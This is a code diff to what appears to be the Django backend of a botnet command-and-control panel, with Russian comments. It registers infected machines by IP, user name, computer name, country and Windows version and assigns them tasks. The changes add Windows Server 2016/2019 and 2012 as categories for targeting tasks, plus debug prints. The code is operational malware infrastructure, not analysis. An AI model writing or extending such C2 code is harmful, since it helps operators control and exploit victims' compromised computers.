@@ -9,10 +9,6 @@ from .models import Bot, Session, Task, IPBackConnect
 import datetime
 import struct
 import requests
-from django.core.paginator import Paginator
-
-
-# from django.core.paginator import Paginator
 
 
 # ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/
@@ -165,6 +161,7 @@ class AdminPanel:
         uid = request.GET['uid']
         return render(request, 'main/personal_task.html', {'uid': uid})
 
+
 # ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\
 
 
@@ -308,10 +305,12 @@ class Handlers:
                     _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64,
                                is_server=is_server, country=country)
 
-                if os_major == 10 and os_minor == 0:
+                if os_major == 10 and os_minor == 0 and not is_server:
                     _bot.is_win10 = True
+                elif (os_major == 10 and os_minor == 0) and is_server:
+                    _bot.is_server2016_19 = True
 
-                if os_major == 6 and os_minor == 1:
+                elif os_major == 6 and os_minor == 1:
                     _bot.is_win7 = True
 
                 if (os_major == 6 and os_minor == 2) and is_server:
@@ -322,6 +321,7 @@ class Handlers:
                     _bot.is_server2012r2 = True
                 elif (os_major == 6 and os_minor == 3) and not is_server:
                     _bot.is_win81 = True
+
 
                 if is_x64:
                     xoc = 'x64'
@@ -338,10 +338,15 @@ class Handlers:
                     task_win = 'win10'
                 elif _bot.is_win8:
                     task_win = 'win8'
+                elif _bot.is_server2016_19:
+                    task_win = 'serv2016_19'
+                elif _bot.is_server2012:
+                    task_win = 'serv2012'
 
                 tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
                                                                  task.xoc == 'x32_64') and (
-                                 task.winos == 'all_win' or task_win in task.winos.split(':')) and task.personal is False]
+                                 task.winos == 'all_win' or task_win in task.winos.split(
+                             ':')) and task.personal is False]
 
                 for task in tasks:
                     _bot.tasks.add(task)
@@ -454,8 +459,10 @@ class Handlers:
         country = data['country'].lower() if data['country'] != '*' else '*'
         _type = data['type']
         _true = [i for i in request.POST if data[i] == 'true']
-        wins = [i for i in _true if 'win' in i]
+        wins = [i for i in _true if 'win' in i or 'serv' in i]
         x_oc = [i for i in _true if 'x' in i]
+
+        print(wins)
 
         s = {
             'win7': Bot.objects.filter(is_win7=True),
@@ -463,8 +470,12 @@ class Handlers:
             'win81': Bot.objects.filter(is_win81=True),
             'win10': Bot.objects.filter(is_win10=True),
             'win11': Bot.objects.filter(is_win11=True),
+            'serv2016_19': Bot.objects.filter(is_server2016_19=True),
+            'serv2012': Bot.objects.filter(is_server2012=True),
             'all_win': Bot.objects.all()
         }
+
+        print(request.POST)
 
         bots = [s[win] for win in wins if len(s[win]) != 0]
         try:
@@ -524,7 +535,8 @@ class Handlers:
         else:
             xoc = 'x32'
 
-        task = Task(name=name, personal=True, country=bot.country, repetitions=1, done=0, winos=task_win, xoc=xoc, type1=_type)
+        task = Task(name=name, personal=True, country=bot.country, repetitions=1, done=0, winos=task_win, xoc=xoc,
+                    type1=_type)
         task.save()
 
         bot.tasks.add(task)
@@ -538,6 +550,5 @@ class Handlers:
         task = Task.objects.get(id=_id)
         task.delete()
         return JsonResponse({'v': '200'})
-
 
 # ОБРАБОТЧИКИ -------------------------------------------- /
